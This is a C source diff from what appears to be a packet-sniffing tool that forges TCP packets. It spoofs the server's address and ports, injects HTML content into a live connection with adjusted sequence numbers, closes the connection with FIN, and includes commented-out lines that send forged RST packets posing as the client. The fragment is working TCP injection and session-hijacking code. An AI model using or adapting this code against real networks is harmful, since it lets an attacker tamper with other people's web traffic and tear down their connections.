@@ -235,28 +235,16 @@ while(1){
      secound_seq = tcp->th_ack;
      third_seq   = g_htonl(g_ntohl(secound_seq)+fakepayload_len);
 
-//Fake_send(first_seq   ,request_seqPlusLength,""          ,TH_ACK          ,ip->ip_dst.s_addr,ip->ip_src.s_addr,tcp->th_dport,tcp->th_sport);
-Fake_send(secound_seq ,request_seqPlusLength,html_content,TH_ACK|TH_PUSH  ,ip->ip_id,ip->ip_off,ip->ip_dst.s_addr,ip->ip_src.s_addr,tcp->th_dport,tcp->th_sport);
-Fake_send(third_seq   ,request_seqPlusLength,""          ,TH_ACK|TH_FIN   ,ip->ip_id,ip->ip_off,ip->ip_dst.s_addr,ip->ip_src.s_addr,tcp->th_dport,tcp->th_sport);
+//Fake_send(first_seq   ,request_seqPlusLength,   ""          ,TH_ACK          ,ip->ip_id,ip->ip_off,ip->ip_dst.s_addr,ip->ip_src.s_addr,tcp->th_dport,tcp->th_sport);
+Fake_send(first_seq   ,request_seqPlusLength,html_content   ,TH_ACK|TH_PUSH  ,ip->ip_id,ip->ip_off,ip->ip_dst.s_addr,ip->ip_src.s_addr,tcp->th_dport,tcp->th_sport);
+Fake_send(third_seq   ,request_seqPlusLength,   ""          ,TH_ACK|TH_FIN   ,ip->ip_id,ip->ip_off,ip->ip_dst.s_addr,ip->ip_src.s_addr,tcp->th_dport,tcp->th_sport);
+
+//Fake_send(request_seqPlusLength,first_seq,"",TH_RST,ip->ip_id,ip->ip_off,ip->ip_src.s_addr,ip->ip_dst.s_addr,tcp->th_sport,tcp->th_dport);
+
       //preten be client, and sent RST to server....fack client
       //TCP_RST_send(htonl(ntohl(tcp->th_seq)+1), ip->ip_src.s_addr, ip->ip_dst.s_addr, tcp->th_sport, tcp->th_dport);
       printf("\n+-------------------------+\n");
   }
- 
- 	//iphdr = (struct ip *)(packet+14);
- 	//tcphdr = (struct tcphdr *)(packet+14+20);
- 	
-	/*dst_port=ntohs(tcphdr->th_dport);
-
-	 	if(count==0)printf("+-------------------------+\n");
- 		printf("Received Packet No.%d:\n", ++count);
- 	*/	
-
- //printf("   ACK: %u\n", g_ntohl(tcp->th_ack) ); 
- //printf("   SEQ: %u\n", g_ntohl(tcp->th_seq) );
- //printf("   SRC PORT: %d\n", ntohs(tcp->th_sport) ); 
- //printf("   DST PORT: %d\n", ntohs(tcp->th_dport) ); 
-
 
 
 	//TCP_RST_send(tcp->th_ack, ip->ip_dst.s_addr, ip->ip_src.s_addr, tcp->th_dport, tcp->th_sport);
